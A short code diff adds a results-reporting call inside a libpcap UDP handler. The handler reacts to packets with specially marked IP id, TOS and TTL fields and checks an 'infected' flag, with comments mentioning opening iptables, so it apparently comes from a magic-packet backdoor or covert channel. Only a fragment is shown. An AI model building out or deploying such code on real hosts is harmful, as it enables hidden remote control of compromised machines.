@@ -115,6 +115,7 @@ void RecvUDP(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packe
             }
         } else if(ip->ip_id == 'r' && ip->ip_tos == 'r' && ip->ip_ttl == 'r'){
             if(Filter->infected){
+                recv_results(Filter->localip, UPORT, FILENAME, false);
                 //results
                 //infected
                 //open iptables
